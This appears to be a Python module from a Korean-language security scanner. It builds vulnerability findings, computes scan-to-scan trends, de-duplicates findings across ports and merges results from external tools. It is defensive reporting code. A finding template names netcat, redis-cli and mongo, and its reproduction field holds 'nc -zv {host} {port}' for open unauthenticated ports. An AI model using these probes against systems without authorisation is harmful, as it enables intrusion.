        "exploitation_difficulty": "Easy",
        "owasp": "A05:2021 - 보안 설정 오류",
        "cwe": "CWE-306",
        "is_new": not is_persistent,
        "is_persistent": is_persistent,
        "is_resolved": False,
        "title": title,
        "category": category,
        "description": reason,
        "attack_vector": f"포트 {port}({service_name})에 직접 접속하여 인증 없이 명령 실행 가능",
        "attack_scenario": "",
        "tools": ["nmap", "netcat", "redis-cli", "mongo", "curl"],
        "cve_references": [],
        "lab_guide": "",
        "recommendation": recommendation,
        "evidence_url": tcp_url,
        "detection_steps": [
            f"포트 {port}({service_name}) 스캔 결과 개방 확인",
            evidence,
        ],
        "evidence_detail": evidence,
        "evidence_screenshot": "",
        "reproduction_cmd": f"nc -zv {host} {port}",
        "affected_endpoints": [tcp_url],
        "cleanup_status": None,
        "probe_confirmed": True,
        "probe_detail": {"port": port, "service": service_name, "evidence": evidence},
    }


# ── Main entry point ──────────────────────────────────────────────────────────

# 트렌드(신규/지속/해결) 비교용 안정 제목: 스캔마다 달라지는 '[포트 80, 443, 8080]' 접미사를
# 제거해 같은 논리 취약점이 포트 조합 변화로 다른 제목처럼 취급되는 것을 막는다.
_PORT_SUFFIX_RE = re.compile(r"\s*\[포트[^\]]*\]\s*$")


def stable_title(title: str) -> str:
    """포트 접미사를 제거한 안정 제목(트렌드/지속/해결 비교 키)."""
    return _PORT_SUFFIX_RE.sub("", title or "").strip()


def _prev_vuln_stable_titles(previous_scans: list[dict] | None) -> set[str]:
    """이전 스캔들에서 '취약'으로 판정된 findings 의 안정 제목 집합."""
    out: set[str] = set()
    for scan in (previous_scans or []):
        a = scan.get("analysis") or {}
        for f in a.get("findings", []):
            if f.get("judgment") == "취약":
                out.add(stable_title(f.get("title", "")))
    return out


def finalize_trend(analysis: dict, previous_scans: list[dict] | None) -> None:
    """모든 findings(rule_engine + main.py 집계: login_sqli/csrf/jwt/external)가 조립된 뒤
    호출한다. 안정 제목(포트 접미사 제거) 기준으로 신규/지속/해결을 재계산하고, 실제로
    사라진 취약점만 '해결(양호)' 항목으로 good_items 에 추가한다.

    이 함수가 없던 시절 rule_engine 내부에서 resolved 를 계산하면 (1) 포트 접미사가
    스캔마다 달라 같은 취약점이 '해결'로 오판되고 (2) login_sqli/csrf 는 rule_engine 이
    생성하지 않아 current_titles 에 없어 '항상 해결'로 오판돼, 확정 취약점이 good_items(양호)로
    새어나갔다. 완전한 findings 조립 후 안정 제목으로 비교해 이 오탐을 제거한다."""
    if not previous_scans:
        analysis.setdefault("trend", "first_scan")
        return
    prev_stable = _prev_vuln_stable_titles(previous_scans)
    cur_vulns = [f for f in analysis.get("findings", []) if f.get("judgment") == "취약"]
    cur_stable = {stable_title(f.get("title", "")) for f in cur_vulns}
    # resolved(조치됨) 판정은 '현재 존재하는 모든 항목' 기준으로 — 확신도가 하락해 참고(discovery)/
    # 공격표면으로 내려간 항목을 '조치됨(양호)'으로 오판하지 않도록(good_items 오염 재발 방지).
    _present = (list(cur_vulns)
                + (analysis.get("attack_surface_items") or [])
                + (analysis.get("discovery_items") or []))
    cur_present_stable = {stable_title(f.get("title", "")) for f in _present}
    resolved = prev_stable - cur_present_stable
    new_stable = cur_stable - prev_stable
    persistent_stable = cur_stable & prev_stable
    for f in cur_vulns:
        st = stable_title(f.get("title", ""))
        f["is_persistent"] = st in prev_stable
        f["is_new"] = st not in prev_stable
        f["is_resolved"] = False
    good = analysis.setdefault("good_items", [])
    _existing_good = {(g.get("title", ""), g.get("is_resolved")) for g in good}
    for title in sorted(resolved):
        if (title, True) in _existing_good:
            continue
        good.append({
            "host": "", "port": 0, "service": "", "title": title,
            "judgment": "양호", "severity": "LOW", "finding_type": "good",
            "report_severity": "Low",
            "is_resolved": True, "is_new": False, "is_persistent": False,
            "evidence_url": "", "detection_steps": [], "evidence_screenshot": "",
            "evidence_detail": "이전 스캔에서 탐지되었으나 이번 스캔에서 재현되지 않음(조치 추정).",
        })
    new_count, resolved_count, persistent_count = len(new_stable), len(resolved), len(persistent_stable)
    trend = ("improving" if resolved_count > new_count
             else "worsening" if new_count > resolved_count else "stable")
    analysis.update({
        "trend": trend,
        "trend_reason": f"신규 {new_count}개, 해결 {resolved_count}개, 지속 {persistent_count}개",
        "new_findings_count": new_count,
        "resolved_findings_count": resolved_count,
        "persistent_findings_count": persistent_count,
    })
    s = analysis.setdefault("summary", {})
    s["good_count"] = len(good)
    if isinstance(s.get("by_type"), dict):
        s["by_type"]["good"] = len(good)


def analyze_with_rules(
    scan_results: list[dict],
    previous_scans: list[dict] | None = None,
    domain_notes: str = "",
) -> dict:
    rules = load_rules()

    # 지속성(persistence) 비교는 안정 제목으로 수행(포트 접미사 무시).
    prev_titles: set[str] = _prev_vuln_stable_titles(previous_scans)

    findings: list[dict] = []

    for host_data in scan_results:
        host = host_data.get("host", "")
        for service in (host_data.get("services") or []):
            port = service.get("port", 0)
            service_name = service.get("service", "")

            # 0) 포트 레벨 취약점 (비HTTP 서비스 — Redis, Telnet, FTP 등)
            port_vuln = service.get("port_vuln")
            if port_vuln and port_vuln.get("vulnerable"):
                pf = _build_port_vuln_finding(host, port, service_name, port_vuln, prev_titles)
                if pf:
                    findings.append(pf)

            if not service.get("http_info"):
                continue

            # 1) 패시브 규칙 기반 점검 (헤더, 쿠키, 경로 등)
            for rule in rules:
                triggered, evidence = _check_rule_with_evidence(rule, service)
                if triggered:
                    title = rule.get("title", "")
                    is_persistent = stable_title(title) in prev_titles
                    findings.append(
                        _build_finding(rule, host, port, service_name, evidence,
                                       is_new=not is_persistent, is_persistent=is_persistent)
                    )

            # 2) 능동 취약점 점검 결과 (active_probing.py 결과)
            #    - dict {probe_key: probe_data}  → 기존 검증 경로(probe_http_vulnerabilities)
            #    - list[finding]                 → orchestrator 경로(USE_PROBE_ORCHESTRATOR=true,
            #      probe_results_to_findings 가 이미 레거시 finding 형식으로 변환해 반환)
            active_probes = service.get("active_probes")
            if isinstance(active_probes, dict) and active_probes:
                active_findings = _build_active_probe_findings(
                    host, port, service_name, active_probes, prev_titles
                )
                findings.extend(active_findings)
            elif isinstance(active_probes, list) and active_probes:
                # 이미 변환된 finding 목록 — host/port/지속성 플래그만 보정 후 합류
                for _f in active_probes:
                    if not isinstance(_f, dict):
                        continue
                    _f.setdefault("host", host)
                    _f.setdefault("port", port)
                    _f.setdefault("service", service_name)
                    _title = _f.get("title", "")
                    _persistent = bool(_title) and _title in prev_titles
                    _f.setdefault("is_persistent", _persistent)
                    _f.setdefault("is_new", not _persistent)
                    _f.setdefault("is_resolved", False)
                    findings.append(_f)

    # Resolved(해결) 판정은 여기서 하지 않는다 — login_sqli/csrf 등 main.py 가 나중에 추가하는
    # finding 이 current_titles 에 아직 없어 '항상 해결'로 오판되기 때문. 모든 finding 이 조립된 뒤
    # main.py 가 finalize_trend() 를 호출해 안정 제목 기준으로 정확히 계산한다.
    # (standalone 호출: 안정 제목 기준으로 rule_engine 자체 findings 만 근거로 잠정 계산)
    current_titles = {stable_title(f.get("title", "")) for f in findings}
    resolved_titles = prev_titles - current_titles if previous_scans else set()

    # ── 동일 취약점이 여러 포트에서 발견된 경우 취합 ──────────────────────────
    # 예: XSS가 80, 443, 8080 포트 모두에서 발견되면 하나의 항목으로 통합.
    # 키: (host, title, 경로+쿼리). scheme/포트는 키에서 제외해 같은 엔드포인트의 포트별 중복만
    # 병합하고, 다른 host·다른 엔드포인트는 분리 유지한다. 취약뿐 아니라 참고(후보) 항목도
    # 동일하게 포트 중복을 제거한다(예전엔 '취약'만 병합돼 idor/nosql/csrf 후보가 포트별 중복).
    def _dedup_key(_f: dict) -> tuple:
        from urllib.parse import urlsplit
        _u = urlsplit(_f.get("evidence_url") or _f.get("url") or "")
        _pathq = (_u.path or "") + (("?" + _u.query) if _u.query else "")
        return (_f.get("host", ""), _f.get("title", ""), _pathq)

    seen_key_idx: dict[tuple, int] = {}
    deduped_findings: list[dict] = []
    for f in findings:
        title = f.get("title", "")
        if not title:
            deduped_findings.append(f)
            continue
        _key = _dedup_key(f)
        if _key in seen_key_idx:
            existing = deduped_findings[seen_key_idx[_key]]
            affected = existing.setdefault("affected_ports", [existing.get("port", 0)])
            new_port = f.get("port", 0)
            if new_port and new_port not in affected:
                affected.append(new_port)
                existing["affected_ports"] = sorted(affected)
                if existing.get("judgment") == "취약":
                    existing["evidence_detail"] = (
                        (existing.get("evidence_detail") or "")
                        + f"\n[추가 확인] 포트 {new_port}에서도 동일 취약점 재현됨"
                    )
        else:
            seen_key_idx[_key] = len(deduped_findings)
            f["affected_ports"] = [f.get("port", 0)]
            deduped_findings.append(f)
    findings = deduped_findings

    overall_risk = _compute_overall_risk(findings)
    attack_chain = _build_attack_chain(findings)

    vuln_findings = [f for f in findings if f.get("judgment") == "취약"]
    new_count = sum(1 for f in vuln_findings if f.get("is_new"))
    persistent_count = sum(1 for f in vuln_findings if f.get("is_persistent"))
    resolved_count = len(resolved_titles)
    high_count = sum(1 for f in vuln_findings if f.get("severity") == "HIGH")

    risk_kr = {"HIGH": "높음", "MEDIUM": "중간", "LOW": "낮음"}.get(overall_risk, "")
    if overall_risk == "GOOD":
        overall_summary = "점검 항목에서 취약점이 발견되지 않았습니다. 보안 상태가 양호합니다."
    else:
        overall_summary = (
            f"전체 보안 위험도 {risk_kr}. {len(vuln_findings)}개 취약점 발견"
            + (f" (HIGH {high_count}개 포함)" if high_count else "")
            + ". OWASP Top 10(2021) 및 CVSS 3.1 기준 적용."
        )

    result: dict = {
        "overall_risk": overall_risk,
        "overall_summary": overall_summary,
        "exploit_summary": attack_chain["lateral_movement"],
        "attack_chain": attack_chain,
        "findings": findings,
    }

    if previous_scans:
        if resolved_count > new_count:
            trend = "improving"
        elif new_count > resolved_count:
            trend = "worsening"
        else:
            trend = "stable"
        result.update({
            "trend": trend,
            "trend_reason": f"신규 {new_count}개, 해결 {resolved_count}개, 지속 {persistent_count}개",
            "new_findings_count": new_count,
            "resolved_findings_count": resolved_count,
            "persistent_findings_count": persistent_count,
        })
    else:
        result["trend"] = "first_scan"

    return result


def _norm_path(url: str) -> str:
    """URL에서 경로만 추출(소문자, 끝 슬래시 제거). 비교/중복판정용 정규화."""
    if not url:
        return ""
    try:
        p = urllib.parse.urlparse(url).path.rstrip("/").lower()
    except Exception:
        return ""
    return p or "/"


def _finding_paths(f: dict) -> set:
    """하나의 finding이 실제로 다루는 경로 집합을 모은다."""
    paths = {_norm_path(f.get("evidence_url", ""))}
    pd = f.get("probe_detail") or {}
    for fp in (pd.get("found_pages") or []):
        paths.add(_norm_path(fp.get("url", "")))
    for fe in (pd.get("found_endpoints") or []):
        paths.add(_norm_path(fe.get("url", "")))
    for ep in (f.get("affected_endpoints") or []):
        paths.add(_norm_path(ep if isinstance(ep, str) else ep.get("url", "")))
    paths.discard("")
    return paths


def _external_url(f: dict) -> str:
    """외부 도구 finding의 실제 발견 URL을 추출(ffuf 등은 evidence_detail의 'URL :' 줄)."""
    m = re.search(r'URL\s*:\s*(\S+)', f.get("evidence_detail", "") or "")
    return m.group(1) if m else f.get("evidence_url", "")


_MERGE_SEV_RANK = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}


def _finding_strength(f: dict) -> tuple:
    """finding 의 '판정 강도'를 비교용 튜플로 반환한다.

    (취약여부, severity 순위, 실증확인, confidence 점수) 순으로 비교하며,
    병합/중복제거 시 더 강한 finding(예: SQLMap CONFIRMED)이 약한 항목(참고/미확인)에
    묻혀 사라지지 않도록 보장하는 데 쓴다.
    """
    is_vuln = 1 if (f.get("judgment") == "취약"
                    and f.get("vulnerability") is not False
                    and f.get("finding_type") != "discovery") else 0
    sev = _MERGE_SEV_RANK.get(str(f.get("severity", "")).upper(), 0)
    confirmed = 1 if f.get("probe_confirmed") else 0
    cscore = int(f.get("confidence_score") or 0)
    return (is_vuln, sev, confirmed, cscore)


def merge_external_findings(findings: list[dict], external_findings: list[dict]) -> list[dict]:
    """
    외부 도구(ffuf/nuclei 등) 결과를 기존 finding과 병합한다.

    취약점은 '무엇이 노출됐는가'로 정의되어야 하며 '어떤 도구가 찾았는가'로 쪼개지면 안 된다.
      1) 외부 finding의 발견 경로가 기존(프로브/패시브) finding과 동일하면 별도 항목을 만들지 않고
         해당 finding의 도구 목록·영향 포트에 흡수한다. (도구별 중복 제거)
      2) 남은 외부 finding끼리도 동일 (호스트, 경로, 유형)이면 affected_ports로 통합한다.
    """
    def _add_evidence_source(tgt: dict, tool: str, port: int):
        if tool:
            tools = tgt.setdefault("tools", [])
            if tool not in tools:
                tools.append(tool)
        if port:
            ap = tgt.setdefault("affected_ports", [tgt.get("port", 0)])
            if port not in ap:
                ap.append(port)
                tgt["affected_ports"] = sorted(x for x in ap if x)

    # 기존 finding이 다루는 (host, path) → finding 매핑 (루트 '/'는 너무 광범위하여 제외)
    covered: dict[tuple, dict] = {}
    for f in findings:
        host = f.get("host", "")
        for p in _finding_paths(f):
            if p and p != "/":
                covered.setdefault((host, p), f)

    kept_external: list[dict] = []
    ext_by_key: dict[tuple, dict] = {}
    for f in external_findings:
        host = f.get("host", "")
        path = _norm_path(_external_url(f))
        tool = f.get("tool_source", "") or (f.get("tools") or [""])[0]
        port = f.get("port", 0)

        # 1) 기존 프로브/패시브 finding과 경로 중복 → 도구·포트만 흡수(중복 항목 방지).
        #    단, 외부 finding 이 더 강한 '취약' 판정(예: SQLMap CONFIRMED)이면 흡수하지 않고
        #    별도 finding 으로 보존한다 — 강한 판정이 약한 항목에 묻혀 사라지는 것을 막는다.
        if path and path != "/" and (host, path) in covered:
            tgt = covered[(host, path)]
            if _finding_strength(f) <= _finding_strength(tgt):
                _add_evidence_source(tgt, tool, port)
                continue
            # else: 외부가 더 강함 → 흡수하지 않고 아래로 진행하여 별도 유지

        # 2) 외부 finding끼리 (host, path, 도구) 중복 → 더 강한 것을 남기고 약한 것을 흡수한다.
        #    (판정 강도 비교 없이 '먼저 온 것'을 남기면 CONFIRMED 가 참고 항목에 흡수되어 사라진다.)
        key = (host, path, tool)
        if path and key in ext_by_key:
            existing = ext_by_key[key]
            strong, weak = ((f, existing) if _finding_strength(f) > _finding_strength(existing)
                            else (existing, f))
            ap = strong.setdefault("affected_ports", [strong.get("port", 0)])
            for _p in ([weak.get("port", 0)] + list(weak.get("affected_ports") or [])):
                if _p and _p not in ap:
                    ap.append(_p)
                    strong["evidence_detail"] = (
                        (strong.get("evidence_detail") or "")
                        + f"\n[추가 확인] 포트 {_p}에서도 동일 경로 노출 확인"
                    )
            strong["affected_ports"] = sorted(x for x in ap if x)
            if strong is f:  # 새 finding 이 더 강함 → kept_external 에서 약한 것을 교체
                kept_external[kept_external.index(existing)] = f
                ext_by_key[key] = f
            continue

        f.setdefault("affected_ports", [port] if port else [])
        ext_by_key[key] = f
        kept_external.append(f)

    return findings + kept_external
